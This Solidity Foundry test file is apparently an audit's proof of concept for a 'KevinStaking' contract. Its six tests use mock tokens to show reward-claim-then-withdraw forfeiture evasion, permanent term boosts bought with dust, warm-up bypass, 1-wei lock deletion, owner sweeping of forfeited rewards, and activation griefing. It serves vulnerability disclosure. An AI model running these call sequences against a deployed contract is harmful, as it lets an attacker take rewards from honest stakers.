// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {KevinStaking} from "../src/KevinStaking.sol";
import {MockERC20, MockERC721} from "./mocks/Mocks.sol";

contract AuditPoC is Test {
    MockERC20 kevin; MockERC20 gme; MockERC721 crew; KevinStaking s;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 constant MIN = 5_000_000e18;
    uint256 constant WARMUP = 5 days;
    uint256 constant DURATION = 30 days;
    uint256 constant POT = 30_000e18;

    function setUp() public {
        vm.warp(1_700_000_000);
        kevin = new MockERC20("KEVIN","KEVIN",18);
        gme = new MockERC20("GME","GME",18);
        crew = new MockERC721();
        s = new KevinStaking(IERC20(address(kevin)), IERC20(address(gme)), IERC721(address(crew)), DURATION, owner);
        vm.startPrank(owner);
        s.setMinStake(MIN); s.setWarmup(WARMUP);
        s.setTerm(1, 30 days, 2_500);
        s.setTerm(2, 90 days, 6_000);
        s.setTerm(3, 180 days, 10_000);
        vm.stopPrank();
        for (uint256 i; i < 2; ++i) {
            address u = i == 0 ? alice : bob;
            kevin.mint(u, 50_000_000e18);
            vm.prank(u); kevin.approve(address(s), type(uint256).max);
        }
    }
    function _fund() internal { gme.mint(address(s), POT); vm.prank(owner); s.notifyRewardAmount(POT); }

    // ---- FINDING 1: claim-then-run defeats forfeiture entirely ----
    function test_F1_claimThenRunPaysZeroPenalty() public {
        vm.prank(alice); s.stakeFor(MIN, 3);   // 180 day lock, +100%
        vm.prank(bob);   s.stakeFor(MIN, 3);   // honest twin
        vm.warp(block.timestamp + WARMUP + 1);
        s.activate(alice); s.activate(bob);
        _fund();
        vm.warp(block.timestamp + 10 days);

        assertTrue(s.isLocked(alice), "still deep inside the term");
        uint256 owed = s.earned(alice);
        assertGt(owed, 0);
        console.log("forfeitIfLeavingNow says alice would lose:", s.forfeitIfLeavingNow(alice));

        vm.startPrank(alice);
        s.getReward();          // <-- no lock check anywhere on this path
        s.withdraw(MIN);        // now the forfeiture branch finds rewards[alice] == 0
        vm.stopPrank();

        assertEq(gme.balanceOf(alice), owed, "kept 100% of the boosted rewards");
        assertEq(kevin.balanceOf(alice), 50_000_000e18, "and 100% of the principal");
        assertFalse(s.isLocked(alice), "lock deleted on the way out, 170 days early");
    }

    // ---- FINDING 2: term boost outlives the term, and applies to later top-ups ----
    function test_F2_dustTermBuysPermanentUnlockedBoost() public {
        // 1 wei, cheapest term, and she is under minStake the whole time so she
        // is not even in the pool.
        vm.prank(alice); s.stakeFor(1, 1);      // 30 days, +25%
        vm.warp(block.timestamp + 30 days + 1);
        assertFalse(s.isLocked(alice), "term served");

        vm.prank(alice); s.stakeFor(MIN * 4, 0); // termIndex 0: no new lock
        (, uint64 until, uint16 boost) = s.lockOf(alice);
        assertEq(until, uint64(0) + until, "");
        console.log("until:", until, " now:", block.timestamp);
        assertLt(until, block.timestamp);
        assertEq(boost, 2_500, "still holding a +25% term boost with no lock at all");
        assertFalse(s.isLocked(alice));

        // bob commits honestly for the same boost, and is locked for 30 days.
        vm.prank(bob); s.stakeFor(MIN * 4, 1);
        vm.warp(block.timestamp + WARMUP + 1);
        s.activate(alice); s.activate(bob);
        assertApproxEqAbs(s.effectiveBalanceOf(alice), s.effectiveBalanceOf(bob), 2, "identical weight");
        console.log("alice eff:", s.effectiveBalanceOf(alice), "bob eff:", s.effectiveBalanceOf(bob));
        assertTrue(s.isLocked(bob));
        assertFalse(s.isLocked(alice), "alice can leave any second, bob cannot");
    }

    // ---- FINDING 3: warm-up does not require holding the minimum ----
    function test_F3_dustDodgesTheFiveDayWarmup() public {
        vm.prank(alice); s.stake(1);          // 1 wei starts the clock
        vm.warp(block.timestamp + WARMUP + 1);

        // Bob is the honest one: he shows up now with real money.
        vm.prank(bob); s.stake(MIN * 4);
        vm.prank(alice); s.stake(MIN * 4);   // same block, same size

        assertTrue(s.qualifies(alice), "alice earns instantly");
        assertFalse(s.qualifies(bob), "bob waits five more days");

        _fund();
        s.activate(alice); s.activate(bob);
        vm.warp(block.timestamp + WARMUP);
        assertGt(s.earned(alice), 0);
        assertEq(s.earned(bob), 0);
        console.log("alice earned during bob's warmup:", s.earned(alice));
    }

    // ---- FINDING 4: withdraw(1 wei) burns the lock but the rewards were already out ----
    function test_F4_oneWeiUnlock() public {
        vm.prank(alice); s.stakeFor(MIN * 2, 3);
        vm.warp(block.timestamp + WARMUP + 1); s.activate(alice); _fund();
        vm.warp(block.timestamp + 10 days);
        vm.startPrank(alice);
        s.getReward();
        s.withdraw(1);        // stays far above minStake; lock is deleted anyway
        vm.stopPrank();
        assertFalse(s.isLocked(alice), "lock gone for 1 wei");
        (,, uint16 boost) = s.lockOf(alice);
        assertEq(boost, 0);
    }

    // ---- FINDING 5: forfeited rewards are recoverable by the owner ----
    function test_F5_forfeitedRewardsAreOwnerRecoverable() public {
        vm.prank(alice); s.stakeFor(MIN, 1);
        vm.prank(bob);   s.stakeFor(MIN, 1);
        vm.warp(block.timestamp + WARMUP + 1); s.activate(alice); s.activate(bob);
        _fund();
        vm.warp(block.timestamp + 10 days);
        uint256 aliceOwed = s.earned(alice);
        vm.prank(alice); s.exit();      // forfeits

        uint256 free = s.freeRewardBalance();
        assertGe(free, aliceOwed);
        vm.prank(owner); s.recoverERC20(IERC20(address(gme)), free);
        assertEq(gme.balanceOf(owner), free, "straight to the treasury EOA");
        console.log("owner swept forfeited rewards:", free);
    }

    // ---- FINDING 6: incumbents are paid to never activate a newcomer ----
    function test_F6_notActivatingIsAFreeGrief() public {
        vm.prank(alice); s.stake(MIN);
        vm.warp(block.timestamp + WARMUP + 1);
        s.activate(alice);
        _fund();
        vm.warp(block.timestamp + 5 days);

        // Bob shows up with 4x the stake and serves his full warm-up.
        vm.prank(bob); s.stake(MIN * 4);
        vm.warp(block.timestamp + WARMUP + 1);
        assertTrue(s.qualifies(bob), "bob has served his warm-up in full");

        // Nobody calls activate(bob). There is no reason alice ever would.
        vm.warp(block.timestamp + 15 days);
        assertEq(s.earned(bob), 0, "bob, qualified for 15 days, has earned nothing");
        console.log("alice (1x stake) took the whole pot:", s.earned(alice));
        console.log("bob   (4x stake) earned:", s.earned(bob));
        assertEq(s.effectiveBalanceOf(bob), 0);
        // and the emissions were not stranded - they went to alice.
        assertEq(s.totalEffectiveSupply(), s.effectiveBalanceOf(alice));
    }
}
